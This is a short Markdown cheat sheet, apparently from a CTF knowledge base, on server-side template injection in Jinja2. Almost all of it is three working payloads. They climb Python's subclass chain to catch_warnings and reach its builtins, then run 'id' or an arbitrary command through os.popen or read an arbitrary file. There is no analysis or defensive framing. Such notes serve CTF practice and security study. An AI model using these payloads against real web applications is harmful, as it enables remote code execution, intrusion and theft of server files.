# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSTI.md
# TITLE: SSTI（服务器端模板注入）
# CATEGORY: web

# 使用 catch_warnings 的 for 循环版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# 命令执行版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}
  {% endif %}
{% endfor %}

# 文件读取版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('filename','r').read() }}
  {% endif %}
{% endfor %}
